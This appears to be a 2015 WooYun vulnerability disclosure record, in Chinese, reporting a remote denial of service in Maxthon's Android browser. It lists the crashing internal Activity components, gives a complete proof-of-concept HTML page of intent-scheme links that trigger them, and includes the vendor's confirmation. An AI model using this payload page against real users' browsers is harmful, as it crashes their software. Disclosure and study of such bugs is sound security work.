{"id": 28754, "wybug_id": "wooyun-2015-0121402", "wybug_title": "傲游Android版浏览器远程拒绝服务漏洞", "wybug_corp": "傲游", "wybug_author": "路人甲", "wybug_date": "2015-06-25 14:40", "wybug_open_date": "2015-09-23 14:48", "wybug_type": "拒绝服务", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["浏览器安全", "远程拒绝服务", "浏览器漏洞挖掘"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-23：\t细节向公众公开  简要描述： 测试了所有未暴露的内部Activity组件，一共几十个啊有木有，很累啊有木有 详细说明：  #### 客户端版本，官网下载的最新版Maxthon_4.4.6.2000_remote_ChinaMainland.apk#### 还是组件拒绝服务， WooYun: 傲游浏览器Android客户端多个漏洞（信息泄露/远程拒绝服务/SQL注入） 已经测试了所有导出的组件，这次测试的是所有没有导出的Activity组件。由于傲游浏览器支持IntentScheme，所以，可以通过这种方式来触发此类漏洞，也就是可以实现远程拒绝服务攻击。有问题的Activity组件如下，共15个\ncom.taobao.newxp.view.handler.umwall.AlimamaWallcom.mx.browser.cloud.MxCloudSendActivityorg.cocos2dx.javascript.AppActivitycom.maxthon.mge.LudeiGameActivitycom.maxthon.mge.CocosPlayGameRunnerActivitycom.chukong.cocosplay.host.CocosPlayHostActivitycom.chukong.cocosplay.host.CocosPlayHostActivityGroupcom.chukong.cocosplay.host.CocosPlayHostListActivitycom.chukong.cocosplay.host.CocosPlayHostTabActivitycom.chukong.cocosplay.host.CocosPlayHostFragmentActivitycom.chukong.cocosplay.host.CocosPlayHostRemoteActivitycom.chukong.cocosplay.host.CocosPlayHostRemoteActivityGroupcom.chukong.cocosplay.host.CocosPlayHostRemoteListActivitycom.chukong.cocosplay.host.CocosPlayHostRemoteTabActivitycom.chukong.cocosplay.host.CocosPlayHostRemoteFragmentActivity\n#### Crash截图，以及部分日志信息\n\n\n\n\n\n\n\n\n\n\n\n#### POC IntentScheme，构造的html页面代码：\n<html><body><h1><a href=\"intent:#Intent;component=com.mx.browser/com.mx.browser.navigation.QuickDialAddActivity;end\">com.mx.browser.navigation.QuickDialAddActivity</a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.taobao.newxp.view.handler.umwall.AlimamaWall;end\"><span style=\"color:red\">com.taobao.newxp.view.handler.umwall.AlimamaWall</span></a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.mx.browser.cloud.MxCloudSendActivity;end\"><span style=\"color:red\">com.mx.browser.cloud.MxCloudSendActivity</span></a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.mx.browser.preferences.BrowserPreferencesPage;end\">com.mx.browser.preferences.BrowserPreferencesPage</a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.mx.browser.VoteDialogActivity;end\">com.mx.browser.VoteDialogActivity</a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.mx.camera.CropImageActivity;end\">com.mx.camera.CropImageActivity</a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.mx.browser.account.MailRegisterActivity;end\">com.mx.browser.account.MailRegisterActivity</a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.mx.browser.account.PhoneRegisterActivity;end\">com.mx.browser.account.PhoneRegisterActivity</a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.mx.browser.navigation.MxFullscreenWebviewActivity;end\">com.mx.browser.navigation.MxFullscreenWebviewActivity</a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.mx.browser.readmode.ReadModeActivity;end\">com.mx.browser.readmode.ReadModeActivity</a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.maxthon.mge.MgeActivity;end\">com.maxthon.mge.MgeActivity</a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/org.cocos2dx.javascript.AppActivity;end\"><span style=\"color:red\">org.cocos2dx.javascript.AppActivity</span></a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.maxthon.mge.MgeOnlineGameRunner;end\">com.maxthon.mge.MgeOnlineGameRunner</a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.maxthon.mge.EgretGameActivity;end\">com.maxthon.mge.EgretGameActivity</a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.maxthon.mge.LudeiGameActivity;end\"><span style=\"color:red\">com.maxthon.mge.LudeiGameActivity</span></a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.maxthon.mge.CocosPlayGameRunnerActivity;end\"><span style=\"color:red\">com.maxthon.mge.CocosPlayGameRunnerActivity</span></a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.chukong.cocosplay.host.CocosPlayHostActivity;end\"><span style=\"color:red\">com.chukong.cocosplay.host.CocosPlayHostActivity</span></a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.chukong.cocosplay.host.CocosPlayHostActivityGroup;end\"><span style=\"color:red\">com.chukong.cocosplay.host.CocosPlayHostActivityGroup</span></a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.chukong.cocosplay.host.CocosPlayHostListActivity;end\"><span style=\"color:red\">com.chukong.cocosplay.host.CocosPlayHostListActivity</span></a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.chukong.cocosplay.host.CocosPlayHostTabActivity;end\"><span style=\"color:red\">com.chukong.cocosplay.host.CocosPlayHostTabActivity</span></a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.chukong.cocosplay.host.CocosPlayHostFragmentActivity;end\"><span style=\"color:red\">com.chukong.cocosplay.host.CocosPlayHostFragmentActivity</span></a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.chukong.cocosplay.host.CocosPlayHostRemoteActivity;end\"><span style=\"color:red\">com.chukong.cocosplay.host.CocosPlayHostRemoteActivity</span></a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.chukong.cocosplay.host.CocosPlayHostRemoteActivityGroup;end\"><span style=\"color:red\">com.chukong.cocosplay.host.CocosPlayHostRemoteActivityGroup</span></a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.chukong.cocosplay.host.CocosPlayHostRemoteListActivity;end\"><span style=\"color:red\">com.chukong.cocosplay.host.CocosPlayHostRemoteListActivity</span></a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.chukong.cocosplay.host.CocosPlayHostRemoteTabActivity;end\"><span style=\"color:red\">com.chukong.cocosplay.host.CocosPlayHostRemoteTabActivity</span></a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.chukong.cocosplay.host.CocosPlayHostRemoteFragmentActivity;end\"><span style=\"color:red\">com.chukong.cocosplay.host.CocosPlayHostRemoteFragmentActivity</span></a></h1><h1><a href=\"intent:#Intent;component=com.mx.browser/com.alipay.sdk.app.H5PayActivity;end\">com.alipay.sdk.app.H5PayActivity</a></h1></body></html>\n#### 使用傲游浏览器访问效果如图（红字显示的都是有问题的，从上面的html代码也可以看出哪些标红了）\n\n   漏洞证明：     修复方案：  作为浏览器，内部组件也要正确处理异常的intent消息   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：4  确认时间：2015-06-25 14:46 厂商回复： 我们已经在修复这些漏洞，非常感谢路人甲提供的信息。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 4, "Ranks": null}